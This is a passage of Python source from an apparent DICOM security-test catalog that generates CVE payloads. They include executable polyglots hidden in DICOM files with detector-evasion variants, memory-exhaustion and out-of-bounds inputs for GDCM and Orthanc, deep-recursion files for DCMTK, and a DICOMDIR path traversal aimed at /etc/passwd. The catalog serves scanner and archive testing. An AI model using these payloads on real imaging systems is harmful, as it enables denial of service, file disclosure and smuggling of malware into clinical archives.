        # Test 7: the PE32 (x86) variant of test 1. The two Optional Header
        # layouts differ in width and field order, so a scanner that parses
        # PE32+ correctly can still walk off the end of a PE32 image.
        results.append(AttackResult(
            name='cve_2019_11687_07_pe32_private_element',
            category='cve',
            payload=CVEAttacks._pedicom(bits=32),
            description='PEDICOM with a PE32 (x86) image in a private OB element',
            expected_behavior='Scanner should detect the PE image behind the '
                              'preamble regardless of Optional Header layout',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element', 'pe_bits': 32}
        ))

        # Test 8: the DOS stub half of the preamble (bytes 0x40-0x7F). It is
        # never executed in protected mode and no DICOM reader looks at it, so
        # it is 64 bytes of storage that survives a round trip through a PACS
        # while belonging to neither format's parsed structure.
        stub_marker = b'C-SCARE-STUB-ZONE:' + bytes(range(0x20, 0x40))
        results.append(AttackResult(
            name='cve_2019_11687_08_dos_stub_zone',
            category='cve',
            payload=CVEAttacks._polyglot_part10(
                dos_header(e_lfanew=0) + stub_marker.ljust(64, b'\x00')),
            description='Marker payload in the preamble DOS stub (bytes '
                        '0x40-0x7F), a region neither format parses',
            expected_behavior='PACS should zero or reject a non-empty preamble '
                              'rather than round-trip 64 attacker bytes',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'preamble_dos_stub',
                      'marker': stub_marker.decode('latin-1')}
        ))

        # Test 9: the padding tail of a Data Element. Same reachability as the
        # private-element carrier, but stealthier against inventory-style
        # defences: no new tag appears, only an existing element whose declared
        # length runs past where its value stops.
        content = b'VENDORCFG\x00'
        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
            implicit_vr=False, little_endian=True)
        value_start = (CVEAttacks._polyglot_head_len() +
                       len(CVEAttacks._polyglot_identity()) + len(creator) +
                       CVEAttacks._LONG_FORM_HEADER_LEN)
        pad_start = value_start + len(content)
        pe_offset = pad_start + (-pad_start % 4)
        carrier = Element(
            0x0009, 0x1002, 'UN',
            content + b'\x00' * (pe_offset - pad_start) + pe_image(pe_offset))

        results.append(AttackResult(
            name='cve_2019_11687_09_element_padding_gap',
            category='cve',
            payload=CVEAttacks._polyglot_part10(
                preamble=dos_header(pe_offset) + b'\x00' * 64,
                insert=creator + carrier.encode(implicit_vr=False,
                                                little_endian=True)),
            description='PE image hidden in the padding tail of a Data Element '
                        'whose declared length covers it',
            expected_behavior='Scanner should inspect whole element values, not '
                              'just the content up to the first padding byte',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'element_padding', 'pe_bits': 64}
        ))

        # Test 10: everything past the final Data Element. A reader stops at
        # the end of the Data Set, so this region is invisible to DICOM
        # tooling — yet it is inside the file the PE loader maps.
        head_len = CVEAttacks._polyglot_head_len()
        trailing_offset = head_len + len(CVEAttacks._polyglot_body())
        results.append(AttackResult(
            name='cve_2019_11687_10_trailing_append',
            category='cve',
            payload=CVEAttacks._polyglot_part10(
                preamble=dos_header(trailing_offset) + b'\x00' * 64,
                trailing=pe_image(trailing_offset)),
            description='PE image appended after the final Data Element, '
                        'outside the Data Set entirely',
            expected_behavior='PACS should truncate or reject bytes past the '
                              'end of the Data Set',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'trailing', 'pe_bits': 64}
        ))

        # Test 11: one PE image cut across three zones. Tests 1 and 7-10 each
        # put a whole image in one region, which is what a contiguous-byte
        # signature is written against; this one splits it along its own
        # structural seams so no run of the file contains the image. The
        # loader still reassembles it, because PointerToRawData was never
        # required to point anywhere in particular.
        fragmented, fragments = CVEAttacks._fragmented_pedicom(bits=64)
        results.append(AttackResult(
            name='cve_2019_11687_11_fragmented_zones',
            category='cve',
            payload=fragmented,
            description='PE headers, section .vend and section .tail split '
                        'across a private element, an element padding tail '
                        'and the trailing region',
            expected_behavior='Scanner should follow the section table rather '
                              'than match a contiguous image; a signature over '
                              'a whole PE will not fire on this file',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'fragmented', 'pe_bits': 64,
                      'fragments': fragments}
        ))

        # Test 12: the ELF analogue of test 1. Not a transposition of the PE
        # construction — the ELF header cannot leave offset 0, and PT_LOAD
        # wants a congruence rather than an alignment, so the payload is built
        # to ELF's rules. See CVEAttacks._elfdicom.
        results.append(AttackResult(
            name='cve_2019_11687_12_elf_private_element',
            category='cve',
            payload=CVEAttacks._elfdicom(bits=64),
            description='ELFDICOM: Elf64_Ehdr in the preamble whose e_phoff '
                        'points at a program header table and PT_LOAD segment '
                        'in a private OB element',
            expected_behavior='Scanner should follow e_phoff past the '
                              'preamble; a magic-table match on \\x7fELF alone '
                              'stops at the first 4 bytes',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
                      'zone': 'private_element', 'elf_bits': 64}
        ))

        # Test 13: the Mach-O analogue, which relocates the least of the three.
        # Only segment contents leave the preamble; the header and load
        # commands cannot. That asymmetry is the point of shipping it.
        results.append(AttackResult(
            name='cve_2019_11687_13_macho_private_element',
            category='cve',
            payload=CVEAttacks._machodicom(arch='arm64'),
            description='Mach-O whose LC_SEGMENT_64 fileoff addresses segment '
                        'contents in a private OB element',
            expected_behavior='Scanner should walk load commands and follow '
                              'fileoff rather than stopping at the header',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'MachO',
                      'zone': 'private_element', 'macho_arch': 'arm64'}
        ))

        # Tests 14 and 15: the same construction as test 1 with its byte
        # statistics deliberately changed. A zero-filled section and a
        # zero-filled DOS stub are structurally correct and statistically
        # unmistakable — an entropy-scoring triage step separates them from
        # real images without parsing anything. These two bracket the range a
        # detector benchmark needs: ordinary read-only data, and the packed
        # profile a compressed payload would have.
        shaped = CVEAttacks._pedicom(
            bits=64, fill='strings', section_name=b'.rdata',
            section_size=0x400, stub=dos_stub())
        results.append(AttackResult(
            name='cve_2019_11687_14_low_entropy_profile',
            category='cve',
            payload=shaped,
            description="PEDICOM whose .rdata section carries string-table "
                        "content and whose DOS stub carries the usual message, "
                        "giving the file an ordinary entropy profile",
            expected_behavior='Detection should not depend on the payload '
                              'being zero-filled; this file has the histogram '
                              'of a benign image',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element', 'pe_bits': 64,
                      'fill': 'strings',
                      'section_entropy': round(
                          shannon_entropy(filler('strings', 0x400)), 3)}
        ))

        results.append(AttackResult(
            name='cve_2019_11687_15_high_entropy_profile',
            category='cve',
            payload=CVEAttacks._pedicom(
                bits=64, fill='packed', section_name=b'.rsrc',
                section_size=0x1000, stub=dos_stub()),
            description='PEDICOM whose .rsrc section carries high-entropy '
                        'content, the profile of a packed or encrypted '
                        'payload',
            expected_behavior='An entropy-scoring triage step should rank this '
                              'file above the string-filled variant; both are '
                              'the same construction',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element', 'pe_bits': 64,
                      'fill': 'packed',
                      'section_entropy': round(
                          shannon_entropy(filler('packed', 0x1000)), 3)}
        ))

        # Test 16: the same construction as test 1, carried by an object an
        # archive has no reason to refuse. Tests 1-15 build their own minimal
        # Part-10 file, which proves the structure and stops there — a
        # Secondary Capture with no Pixel Data and no Study/Series UID is an
        # incomplete object, so a PACS rejects it against the IOD and the
        # private element is never read. Here the payload rides a complete
        # image that still renders, so a rejection is about the executable.
        carried, carried_meta = CVEAttacks._pedicom_on_carrier(
            bits=64, fill='strings', section_name=b'.rdata')
        results.append(AttackResult(
            name='cve_2019_11687_16_pe_in_storable_image',
            category='cve',
            payload=carried,
            description='PEDICOM embedded in a complete Secondary Capture '
                        'object that still renders its image',
            expected_behavior='PACS should reject or strip the executable; a '
                              'rejection here is about the payload, not about '
                              'an incomplete object',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element',
                      'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                      'sop_instance_uid': carried_meta[
                          'carrier_sop_instance_uid'],
                      'carrier': 'secondary_capture_image',
                      **carried_meta}
        ))

        # Tests 17 and 18: the length-prefixed private-tag container the V3GAS
        # talk calls SLDPLD — a magic, a 32-bit size, and a body a loader
        # would read back out. The body here is an inert marker; the framing
        # is what a scanner has to recognise.
        #
        # Two magics on purpose. The talk states the real string is generated
        # per engagement, so a detector keyed on the published literal catches
        # 17 and misses 18, while one keyed on the structure catches both.
        # Shipping only the published magic would score the weaker detector as
        # a pass.
        for suffix, name, magic in (
                ('17', 'published_magic', CVEAttacks._SLDPLD_EXAMPLE_MAGIC),
                ('18', 'rotated_magic', CVEAttacks._SLDPLD_ALTERNATE_MAGIC)):
            payload, container_meta = CVEAttacks._sldpld_on_carrier(magic)
            results.append(AttackResult(
                name=f'cve_2019_11687_{suffix}_private_tag_container_{name}',
                category='cve',
                payload=payload,
                description='Length-prefixed container (magic + uint32 size + '
                            f'body) in a private OB element, magic '
                            f'{container_meta["container_magic"]!r}',
                expected_behavior='Scanner should key on the container framing '
                                  'inside private elements, not on one literal '
                                  'magic string',
                metadata={'cve': 'CVE-2019-11687',
                          'zone': 'private_element',
                          'container_format': 'magic+len32+body',
                          'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                          'carrier': 'secondary_capture_image',
                          **container_meta}
            ))

        # Tests 19-22: ELF coverage to match the PE side, for a Linux target.
        # Until now ELF had two payloads to PE's ten, so a Linux PACS or
        # scanner was being tested against a fraction of the surface.

        # 19: the ELF32 variant of test 12. Elf32_Phdr orders its fields
        # differently from Elf64_Phdr — p_flags is last rather than second —
        # so a reader that handles one layout and assumes the other reads
        # segment permissions out of the wrong offset.
        results.append(AttackResult(
            name='cve_2019_11687_19_elf32_private_element',
            category='cve',
            payload=CVEAttacks._elfdicom(bits=32),
            description='ELFDICOM with a 32-bit ELF whose program header '
                        'table and PT_LOAD live in a private OB element',
            expected_behavior='Scanner should follow e_phoff regardless of ELF '
                              'class; Elf32_Phdr is not Elf64_Phdr with '
                              'smaller fields',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
                      'zone': 'private_element', 'elf_bits': 32}
        ))

        # 20: ELF fragmentation, which reaches a region the PE version cannot.
        # See CVEAttacks._fragmented_elfdicom.
        elf_fragged, elf_frags = CVEAttacks._fragmented_elfdicom()
        results.append(AttackResult(
            name='cve_2019_11687_20_elf_fragmented_zones',
            category='cve',
            payload=elf_fragged,
            description='ELF split across the preamble tail, a private '
                        'element, an element padding tail and the trailing '
                        'region',
            expected_behavior='Scanner should follow the program header table '
                              'rather than match a contiguous image, and must '
                              'not assume PE alignment rules bound where an '
                              'ELF segment can sit',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
                      'zone': 'fragmented', 'elf_bits': 64,
                      'fragments': elf_frags}
        ))

        # 21 and 22: ELF on an object a PACS will actually keep — the Linux
        # counterpart of test 16. ET_DYN ships alongside ET_EXEC because
        # modern Linux toolchains emit PIE binaries as shared objects, and
        # file(1) reports them differently; a scanner keyed on 'ELF
        # executable' misses every PIE on the system.
        for suffix, name, elf_type in (
                ('21', 'elf_in_storable_image', ELF_TYPE_EXEC),
                ('22', 'elf_pie_in_storable_image', ELF_TYPE_DYN)):
            carried_elf, elf_meta = CVEAttacks._elfdicom_on_carrier(
                elf_type=elf_type)
            results.append(AttackResult(
                name=f'cve_2019_11687_{suffix}_{name}',
                category='cve',
                payload=carried_elf,
                description=f'ELFDICOM ({elf_meta["elf_type"]}) embedded in a '
                            'complete Secondary Capture object that still '
                            'renders its image',
                expected_behavior='PACS should reject or strip the executable; '
                                  'a rejection here is about the payload, not '
                                  'about an incomplete object',
                metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
                          'zone': 'private_element',
                          'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                          'sop_instance_uid': elf_meta[
                              'carrier_sop_instance_uid'],
                          'carrier': 'secondary_capture_image',
                          **elf_meta}
            ))

        # Test 23: the construction exactly as the paper documents it, with
        # the carrier at (0009,0000) and no private creator. See
        # CVEAttacks._pedicom_published_tag for why the rest of the catalog
        # deviates and why this one does not.
        results.append(AttackResult(
            name='cve_2019_11687_23_published_group_length_tag',
            category='cve',
            payload=CVEAttacks._pedicom_published_tag(),
            description='PEDICOM whose PE image sits in (0009,0000) with no '
                        'private creator, matching the published reference '
                        'implementation',
            expected_behavior='Scanner should inspect private-group values '
                              'whatever element number they use, and a '
                              'validator should flag an OB value in a Group '
                              'Length tag',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                      'zone': 'private_element', 'pe_bits': 64,
                      'private_tag': '(0009,0000)',
                      'conformance': 'non-conformant-by-design',
                      'bug_class': 'group-length-tag-as-carrier'}
        ))

        # Which of these survive the wire, and which are file-only.
        #
        # C-STORE carries a Data Set. The 128-byte preamble is a *file*
        # construct that PS3.10 defines outside the Data Set, so it is never
        # transmitted — the receiving SCP writes its own, zeroed. Bytes past
        # the final Data Element are outside the Data Set too and go the same
        # way. Measured against a pynetdicom Storage SCP: every payload whose
        # foreign content lives in the preamble or the trailing region arrives
        # as an ordinary object with nothing in it, and the fragmented ones do
        # not decode as a Data Set at all.
        #
        # The consequence is worth stating plainly: **no executable polyglot
        # survives C-STORE as a loadable image**, because MZ, \x7fELF and the
        # Mach-O magic all sit at offset 0, and e_lfanew sits at 0x3C. What
        # does survive is whatever is inside a Data Element — the PE headers
        # and section data in a private element, the container blob, the
        # padding-tail payload. Those reach the archive intact.
        #
        # So only the payloads whose mechanism actually arrives are scored on
        # acceptance. Tagging the rest would report a finding against an
        # archive that received an ordinary image, which is the false positive
        # this catalog is supposed to avoid producing.
        SURVIVES_CSTORE = {'private_element', 'element_padding'}
        for result in results:
            survives = result.metadata.get('zone') in SURVIVES_CSTORE
            result.metadata['survives_cstore'] = survives
            if survives:
                result.metadata.setdefault('finding_on',
                                           ProtocolMonitor.FINDING_ON_STORE)
            else:
                # Not "undeliverable" — deliverable by any path that moves the
                # whole Part-10 file. DICOMweb STOW-RS posts complete
                # instances as application/dicom, preamble included, which is
                # the pathway Hetzel et al. used against Orthanc; so do media,
                # DICOMDIR and import folders. Only C-STORE drops it, because
                # only C-STORE sends a Data Set instead of a file.
                result.metadata.setdefault('delivery_scope', 'whole_file')

        return results

    # -------------------------------------------------------------------------
    # CVE-2026-3650: GDCM memory-leak / resource-exhaustion via non-standard VR
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_3650_gdcm_vr_memory_leak() -> List[AttackResult]:
        """
        CVE-2026-3650: Grassroots DICOM (GDCM) memory-leak DoS.

        Parsing a malformed file whose File Meta Information carries a
        non-standard Value Representation makes GDCM fall back to a wide
        (32-bit) length field and eagerly allocate a buffer sized to the
        declared length. A ~150-byte file can drive a ~4.2 GB allocation that
        is never released — remote, unauthenticated availability impact. No
        vendor patch at time of writing (CISA ICSMA-26-083-01).

        These payloads place an element with a non-standard VR + an enormous
        declared length in the (always-parsed) Group 0002 meta header, so the
        allocation happens before any transfer-syntax negotiation.
        """
        results = []

        # Test 1: non-standard VR 'ZZ' on a meta element, 32-bit length ~4 GB.
        # 0xFFFFFFF0 > 0xFFFF forces Element.encode into the long-form layout
        # (VR + 2 reserved + 4-byte length), mirroring how GDCM treats an
        # unknown VR as UN/OB and reads a 32-bit length.
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.file_meta.add_element(
            Element.raw(tag=0x00020099, vr=b'ZZ', value=b'', length=0xFFFFFFF0)
        )
        df.dataset = b''
        results.append(AttackResult(
            name='cve_2026_3650_01_nonstandard_vr_huge_length',
            category='cve',
            payload=df.encode(),
            description='Meta element with non-standard VR "ZZ" declaring a '
                        '~4 GB length from a tiny file',
            expected_behavior='Parser must bound/stream allocation by available '
                              'bytes, not by the declared length',
            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
                      'bug_class': 'allocation-exhaustion',
                      'target_field': '(0002,0099) non-standard VR'}
        ))

        # Test 2: unknown VR 'QQ' on the real Private Information tag (0002,0102).
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.file_meta.add_element(
            Element.raw(tag=0x00020102, vr=b'QQ', value=b'\x00', length=0x7FFFFFFF)
        )
        df.dataset = b''
        results.append(AttackResult(
            name='cve_2026_3650_02_unknown_vr_private_info',
            category='cve',
            payload=df.encode(),
            description='Private Information (0002,0102) with unknown VR "QQ" '
                        'and a 2 GB declared length',
            expected_behavior='Parser must not pre-allocate the declared length',
            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
                      'bug_class': 'allocation-exhaustion',
                      'target_field': '(0002,0102) Private Information'}
        ))

        # Test 3: UN (Unknown) VR in the meta header with undefined/huge length.
        # UN legitimately uses the 32-bit length form, so a value of 0xFFFFFFF0
        # is a single oversized allocation request rather than undefined length.
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.file_meta.add_element(
            Element.raw(tag=0x00020099, vr=b'UN', value=b'', length=0xFFFFFFF0)
        )
        df.dataset = b''
        results.append(AttackResult(
            name='cve_2026_3650_03_un_vr_oversized_length',
            category='cve',
            payload=df.encode(),
            description='UN-typed meta element declaring ~4 GB with no payload',
            expected_behavior='Parser must validate declared length against the '
                              'remaining file size',
            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
                      'bug_class': 'allocation-exhaustion',
                      'target_field': '(0002,0099) UN oversized length'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2026-5437 / CVE-2026-5442: Orthanc DicomStreamReader meta-header OOB
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_5437_meta_header_oob() -> List[AttackResult]:
        """
        CVE-2026-5437 (and sibling CVE-2026-5442): out-of-bounds read in
        Orthanc's DicomStreamReader while parsing the DICOM meta header.

        The reader trusts attacker-controlled length/offset fields in the
        Group 0002 meta header without bounds-checking them against the
        allocated metadata buffer, so a crafted header steers reads past the
        end of the buffer (unsafe arithmetic + missing bounds checks). Part of
        the CVE-2026-5437..5445 Orthanc batch fixed in 1.12.11.

        Black-box deliverable against a live Orthanc SCP; also a seed for the
        DCMTK/Orthanc grey-box parse track.
        """
        results = []

        # Test 1: File Meta Group Length (0002,0000) over-declares the meta
        # group, so the reader keeps consuming "meta" bytes past EOF.
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.file_meta._group_length_override = 0x7FFFFFFF
        df.dataset = b''
        results.append(AttackResult(
            name='cve_2026_5437_01_grouplen_overdeclared',
            category='cve',
            payload=df.encode(),
            description='File Meta Group Length declares 2 GB of meta; actual '
                        'header is a few dozen bytes',
            expected_behavior='Reader must clamp meta parsing to the buffer size',
            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
                      'cve_batch': 'CVE-2026-5437..5445', 'product': 'Orthanc',
                      'bug_class': 'oob-read',
                      'target_field': '(0002,0000) File Meta Group Length'}
        ))

        # Test 2: a meta element whose declared length runs off the end of the
        # file — a classic OOB read of the metadata buffer.
        meta_body = struct.pack('<HH', 0x0002, 0x0010) + b'UI'
        meta_body += struct.pack('<H', 0xFFF0)  # declared 65520, only a few bytes follow
        meta_body += b'1.2.840.10008.1.2.1'     # truncated value, no trailing bytes
        payload = b'\x00' * 128 + b'DICM'
        payload += struct.pack('<HH', 0x0002, 0x0000) + b'UL' + struct.pack('<H', 4)
        payload += struct.pack('<I', len(meta_body))
        payload += meta_body
        results.append(AttackResult(
            name='cve_2026_5437_02_element_length_past_eof',
            category='cve',
            payload=payload,
            description='Transfer Syntax UID in meta declares 0xFFF0 bytes but '
                        'the file ends mid-value',
            expected_behavior='Reader must detect the truncated meta element',
            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
                      'product': 'Orthanc', 'bug_class': 'oob-read',
                      'target_field': '(0002,0010) Transfer Syntax UID'}
        ))

        # Test 3: arithmetic-overflow length (~0xFFFFFFFF) in the meta header;
        # length + cursor wraps and slips past the bounds check.
        meta_body = struct.pack('<HH', 0x0002, 0x0003) + b'UI'
        meta_body += b'\x00\x00'                    # reserved (long form)
        meta_body += struct.pack('<I', 0xFFFFFFFE)  # near-UINT32_MAX length
        meta_body += b'1.2.3'
        payload = b'\x00' * 128 + b'DICM'
        payload += struct.pack('<HH', 0x0002, 0x0000) + b'UL' + struct.pack('<H', 4)
        payload += struct.pack('<I', len(meta_body))
        payload += meta_body
        results.append(AttackResult(
            name='cve_2026_5437_03_length_arithmetic_overflow',
            category='cve',
            payload=payload,
            description='Meta SOP Instance UID with a near-UINT32_MAX length to '
                        'overflow cursor + length arithmetic',
            expected_behavior='Reader must use overflow-safe bounds checks',
            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
                      'product': 'Orthanc', 'bug_class': 'oob-read',
                      'target_field': '(0002,0003) Media Storage SOP Instance UID'}
        ))

        # Test 4: Group Length under-declares, then a real element follows; the
        # reader may mis-track where meta ends and read adjacent memory.
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.file_meta._group_length_override = 2
        df.dataset = b''
        results.append(AttackResult(
            name='cve_2026_5437_04_grouplen_underdeclared',
            category='cve',
            payload=df.encode(),
            description='File Meta Group Length declares only 2 bytes of a '
                        'multi-element meta header',
            expected_behavior='Reader must reconcile group length with parsed '
                              'element extents',
            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
                      'product': 'Orthanc', 'bug_class': 'oob-read',
                      'target_field': '(0002,0000) File Meta Group Length'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2026-10528: Orthanc/DCMTK stack overflow in DcmItem::read
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_10528_dcmitem_read_stack() -> List[AttackResult]:
        """
        CVE-2026-10528: stack-based buffer overflow reached through
        ``DcmItem::read`` (OrthancFramework FromDcmtkBridge / DCMTK parser).

        Like the use-after-free entries (32135/24793/24794), these are
        *structural triggers / regression seeds*: a single static buffer cannot
        by itself guarantee a stack smash, so the payloads steer the recursive
        ``DcmItem::read`` descent — deeply nested items/sequences — into the
        vulnerable path rather than reproducing the overflow deterministically.
        Best used as a grey-box seed against the already-instrumented DCMTK
        parse target; the engine mutates around the structure.
        """
        results = []

        # Test 1: deeply nested undefined-length sequences — each level recurses
        # one frame deeper into DcmItem::read.
        depth = 2000
        data = b''
        for _ in range(depth):
            data += struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
            data += b'SQ' + b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)       # undefined length
            data += struct.pack('<HH', 0xFFFE, 0xE000)  # item start
            data += struct.pack('<I', 0xFFFFFFFF)       # undefined-length item
        results.append(AttackResult(
            name='cve_2026_10528_01_deep_sequence_recursion',
            category='cve',
            payload=data,
            description=f'{depth} nested undefined-length sequences driving '
                        'DcmItem::read recursion',
            expected_behavior='Parser must bound nesting depth to avoid stack '
                              'exhaustion',
            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
                      'delivery_hint': 'cstore',
                      'transfer_syntax': '1.2.840.10008.1.2.1',
                      'structural_trigger': True,
                      'bug_class': 'recursion-stack-exhaustion',
                      'target_func': 'DcmItem::read'}
        ))

        # Test 2: deeply nested defined-length items — the explicit-length
        # variant of the same recursive descent.
        depth = 1500
        # Build inside-out so each item's declared length covers its children.
        inner = b''
        for _ in range(depth):
            seq_hdr = struct.pack('<HH', 0x0008, 0x1115) + b'SQ' + b'\x00\x00'
            item_hdr = struct.pack('<HH', 0xFFFE, 0xE000)
            item_body = item_hdr + struct.pack('<I', len(inner)) + inner
            inner = seq_hdr + struct.pack('<I', len(item_body)) + item_body
        results.append(AttackResult(
            name='cve_2026_10528_02_deep_defined_length_items',
            category='cve',
            payload=inner,
            description=f'{depth} nested defined-length items reaching '
                        'DcmItem::read',
            expected_behavior='Parser must bound recursion regardless of '
                              'defined vs undefined length',
            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
                      'delivery_hint': 'cstore',
                      'transfer_syntax': '1.2.840.10008.1.2.1',
                      'structural_trigger': True,
                      'bug_class': 'recursion-stack-exhaustion',
                      'target_func': 'DcmItem::read'}
        ))

        # Test 3: nested sequences wrapped in a Part 10 file so the trigger is
        # reached via the normal DcmItem::read entry, not a raw fragment.
        depth = 1000
        inner = b''
        for _ in range(depth):
            inner += struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
            inner += b'SQ' + b'\x00\x00'
            inner += struct.pack('<I', 0xFFFFFFFF)
            inner += struct.pack('<HH', 0xFFFE, 0xE000)
            inner += struct.pack('<I', 0xFFFFFFFF)
        for _ in range(depth):
            inner += struct.pack('<HH', 0xFFFE, 0xE00D) + struct.pack('<I', 0)
            inner += struct.pack('<HH', 0xFFFE, 0xE0DD) + struct.pack('<I', 0)
        df = DicomFile()
        df.set_meta(
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax='1.2.840.10008.1.2.1',
        )
        df.dataset = inner
        results.append(AttackResult(
            name='cve_2026_10528_03_part10_nested_sequences',
            category='cve',
            payload=df.encode(),
            description=f'Part 10 file with {depth} balanced nested sequences',
            expected_behavior='Parser must bound nesting depth before the stack '
                              'is exhausted',
            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
                      'delivery_hint': 'cstore',
                      'structural_trigger': True,
                      'bug_class': 'recursion-stack-exhaustion',
                      'target_func': 'DcmItem::read'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2026-32711: pydicom FileSet/DICOMDIR ReferencedFileID path traversal
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_32711_dicomdir_traversal() -> List[AttackResult]:
        """
        CVE-2026-32711: path traversal in pydicom FileSet/DICOMDIR.

        A crafted DICOMDIR sets a directory record's Referenced File ID
        (0004,1500) to components that escape the File-set root. pydicom
        resolves the path only to confirm it exists, never checking it stays
        under the root, so FileSet ``copy()`` / ``write()`` /
        ``remove()+write(use_existing=True)`` perform file I/O outside the root
        — arbitrary read/copy and, in some flows, move/delete. Affects
        2.0.0-rc.1 .. 3.0.1; fixed in 2.4.5 / 3.0.2.

        Each payload is a complete Part 10 DICOMDIR (Media Storage Directory
        Storage, 1.2.840.10008.1.3.10) whose single IMAGE record carries a
        traversing Referenced File ID. ReferencedFileID is multi-valued CS:
        each path component is one backslash-delimited value.
        """
        media_dir_sop_class = '1.2.840.10008.1.3.10'  # Media Storage Directory Storage

        def _short(group: int, elem: int, vr: bytes, value: bytes) -> bytes:
            """Explicit VR LE, short-form (2-byte length) element."""
            if len(value) % 2:
                value += b'\x00' if vr in (b'UI', b'OB') else b' '
            return struct.pack('<HH', group, elem) + vr + struct.pack('<H', len(value)) + value

        def _build_dicomdir(ref_file_id: str) -> bytes:
            # One directory record carrying the traversing Referenced File ID.
            item = b''
            item += _short(0x0004, 0x1400, b'UL', struct.pack('<I', 0))   # offset of next record
            item += _short(0x0004, 0x1410, b'US', struct.pack('<H', 0xFFFF))  # record in-use flag
            item += _short(0x0004, 0x1420, b'UL', struct.pack('<I', 0))   # offset of lower-level entity
            item += _short(0x0004, 0x1430, b'CS', b'IMAGE')               # directory record type
            item += _short(0x0004, 0x1500, b'CS', ref_file_id.encode('ascii'))  # Referenced File ID
            item += _short(0x0004, 0x1510, b'UI', SECONDARY_CAPTURE_SOP_CLASS_UID.encode())
            item += _short(0x0004, 0x1511, b'UI', b'1.2.3.4.5')

            # Undefined-length Directory Record Sequence (0004,1220).
            seq = struct.pack('<HH', 0xFFFE, 0xE000) + b'\xFF\xFF\xFF\xFF'  # item, undefined length
            seq += item
            seq += struct.pack('<HH', 0xFFFE, 0xE00D) + struct.pack('<I', 0)  # item delim
            seq += struct.pack('<HH', 0xFFFE, 0xE0DD) + struct.pack('<I', 0)  # seq delim
            sq = struct.pack('<HH', 0x0004, 0x1220) + b'SQ' + b'\x00\x00' + b'\xFF\xFF\xFF\xFF' + seq

            dataset = b''
            dataset += _short(0x0004, 0x1130, b'CS', b'CSCARE')           # File-set ID
            dataset += _short(0x0004, 0x1200, b'UL', struct.pack('<I', 0))  # offset of first record
            dataset += _short(0x0004, 0x1202, b'UL', struct.pack('<I', 0))  # offset of last record
            dataset += _short(0x0004, 0x1212, b'US', struct.pack('<H', 0))  # consistency flag
            dataset += sq

            df = DicomFile()
            df.set_meta(
                sop_class_uid=media_dir_sop_class,
                sop_instance_uid='1.2.3.4.5',
                transfer_syntax='1.2.840.10008.1.2.1',
            )
            df.dataset = dataset
            return df.encode()

        results = []

        # Test 1: relative '..' escape (cross-platform; components join with the
        # OS separator) targeting a sensitive file for read/copy.
        ref = r'..\..\..\..\..\..\etc\passwd'
        results.append(AttackResult(
            name='cve_2026_32711_01_relative_escape',
            category='cve',
            payload=_build_dicomdir(ref),
            description='DICOMDIR ReferencedFileID escapes the File-set root '
                        'with ".." components to /etc/passwd',
            expected_behavior='FileSet must reject resolved paths outside the '
                              'File-set root',
